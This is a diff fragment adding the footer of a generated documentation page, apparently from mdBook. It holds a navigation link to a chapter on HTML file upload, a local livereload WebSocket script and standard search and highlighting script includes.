+                    <a rel="next prefetch" href="htmlfileupload.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
